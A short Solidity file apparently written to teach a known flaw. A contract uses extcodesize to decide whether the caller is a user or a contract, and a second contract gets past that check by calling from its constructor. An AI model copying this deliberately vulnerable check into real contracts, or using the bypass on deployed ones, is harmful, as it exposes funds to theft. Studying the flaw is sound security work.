// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.18;

contract VulnerableContract
{
    function notcontracts() public view returns (uint256 somethingReallyValuable)
    {
        //assume all checks are done
        uint256 contract_codesize;
        address who_is_calling;
        who_is_calling = msg.sender;

        //First check the extcodesize of the caller

        // This is the way you can check if the caller is EOA or a smart contract using assembly

        /* There is a way to make a malicious contract seem as though there is no code associated with it, 
        and that is by calling the vulnerable contract and function from within the malicious contract's 
        constructor */

        assembly {
            contract_codesize := extcodesize(who_is_calling)
        }
        if(contract_codesize > 0)
        {
            //THIS IS A CONTRACT CALLING SO THEY CAN'T GET OUR SUPER VALUABLE ASSET
            somethingReallyValuable = 0;
        }
        else
        {
            //THIS IS A USER CALLING SO THEY CAN GET ALL OF OUR SUPER VALUABLE ASSET
           somethingReallyValuable = type(uint256).max; 
        }
    }
}

contract testCodeSize{
    uint256 public allTheirValue;
    address public vulnerablecontract;

    //When the constructor runs the extcodesize is still 0
    //lets see what allTheirValue is after the constructor
    //allTheirValue should be uint256 Max value.
    constructor(address _vulnerablecontract){
        vulnerablecontract = _vulnerablecontract;
        allTheirValue = VulnerableContract(vulnerablecontract).notcontracts();
    }
    //This function should set allTheirValue to 0
    function wontWork() external {
        allTheirValue = VulnerableContract(vulnerablecontract).notcontracts();
    }


}